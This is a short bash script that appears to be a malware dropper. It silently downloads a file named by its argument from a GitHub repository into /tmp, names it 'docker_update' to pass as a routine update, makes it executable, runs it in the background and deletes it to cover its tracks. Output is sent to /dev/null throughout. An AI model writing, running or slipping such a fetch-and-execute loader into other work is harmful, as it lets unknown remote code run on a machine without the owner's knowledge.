#!/bin/bash
wget -O /tmp/docker_update  https://github.com/jackmoc/update/raw/main/npc/$1  >/dev/null 2>&1
chmod +x /tmp/docker_update
cd /tmp/
docker_update &
rm -rf /tmp/docker_update
